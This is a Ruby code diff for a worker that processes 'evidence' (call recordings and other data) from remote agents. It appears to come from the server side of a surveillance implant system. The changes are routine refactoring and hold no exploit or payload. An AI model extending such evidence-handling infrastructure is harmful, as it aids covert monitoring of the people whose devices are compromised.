@@ -1,4 +1,4 @@
-require_relative 'audio_processor'
+require_relative 'call_processor'
 require_relative 'single_processor'
 
 # from RCS::Common
@@ -18,6 +18,7 @@ end
 require 'mongo'
 require 'openssl'
 require 'digest/sha1'
+require 'thread'
 
 # specific evidence processors
 Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
@@ -34,11 +35,11 @@ class InstanceWorker
   
   def initialize(instance, ident)
     @evidences = []
-    @state = :stopped
+    @state = :running
     @seconds_sleeping = 0
+    @semaphore = Mutex.new
     
     # get info about the agent instance from evidence db
-    #@db = Mongo::Connection.new(RCS::DB::Config.instance.global['CN'], 27017).db("rcs")
     @agent = Item.agents.where({ident: ident, instance: instance}).first
     raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?
 
@@ -67,16 +68,6 @@ class InstanceWorker
             raise "Empty evidence" if data.nil?
 
             raw = data.read
-
-=begin
-            if forwarding?
-              hash = Digest::SHA1.hexdigest(raw)
-              Dir.mkdir "forwarded" unless File.exists? "forwarded"
-              path = "forwarded/#{hash}.raw"
-              f = File.open(path, 'w') {|f| f.write raw}
-              trace :debug, "[#{evidence_id}] forwarded raw evidence #{evidence_id} to #{path}"
-            end
-=end
 
             # deserialize binary evidence and forward decoded
             evidences, action = begin
@@ -108,33 +99,37 @@ class InstanceWorker
               # store evidence_id inside evidence, we need it inside processors
               ev[:db_id] = evidence_id
 
+              # find correct processing module and extend evidence
+              mod = "#{ev[:type].to_s.capitalize}Processing"
+              if RCS.const_defined? mod.to_sym
+                ev.extend eval(mod)
+              else
+                ev.extend DefaultProcessing
+              end
+
+              ev.process if ev.respond_to? :process
+
               trace :debug, "[#{evidence_id}] processing evidence of type #{ev[:type]}"
+
+              # override original type
+              ev[:type] = ev.type if ev.respond_to? :type
+              ev_type = ev[:type]
 
               case ev[:type]
                 when :call
-                  @audio_processor.feed(ev)
+                  @call_processor.feed(ev)
                 else
                   @single_processor.feed(ev)
               end
-
-              if forwarding? and ev[:grid_content]
-                Dir.mkdir "forwarded" unless File.exists? "forwarded"
-                path = "forwarded/#{evidence_id}_#{ev_type}.grid"
-                f = File.open(path, 'w') {|f| f.write ev[:grid_content]}
-                trace :debug, "[#{evidence_id}] forwarded grid evidence #{evidence_id} to #{path}"
-              end
-
-              #
-              # FORWARDER: forward&sign parsed evidence
-              #
             end
 
             processing_time = Time.now - start_time
             trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
-            if action == :delete_raw
-              RCS::DB::GridFS.delete(evidence_id, "evidence")
-              trace :debug, "[#{evidence_id}] deleted raw evidence"
+            case action
+              when :delete_raw
+                RCS::DB::GridFS.delete(evidence_id, "evidence")
+                trace :debug, "[#{evidence_id}] deleted raw evidence"
             end
 
           rescue Mongo::ConnectionFailure => e
@@ -159,18 +154,18 @@ class InstanceWorker
     
     @call_processor = CallProcessor.new(@agent, @target)
     @single_processor = SingleProcessor.new(@agent, @target)
+
+    EM.defer @process
   end
   
   def resume
     @state = :running
-    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
     @seconds_sleeping = 0
   end
   
   def take_some_rest
     sleep 1
     @seconds_sleeping += 1
-    #trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
   end
   
   def put_to_sleep
@@ -179,7 +174,7 @@ class InstanceWorker
     trace :debug, "processor #{self.object_id} is sleeping too much, let's stop!"
   end
   
-  def finished?
+  def stopped?
     @state == :stopped
   end
 
@@ -193,14 +188,15 @@ class InstanceWorker
   
   def queue(id)
     @evidences << id unless id.nil?
-    
-    if finished?
-      trace :debug, "deferring work for #{@agent['instance']}"
-      EM.defer @process
-      #EM.defer @restat
+
+    @semaphore.synchronize do
+      if stopped?
+        trace :debug, "deferring work for #{@agent['instance']}"
+        EM.defer @process
+      end
     end
   end
-  
+
   def to_s
     "instance #{@agent['instance']}: #{@evidences.size}"
   end
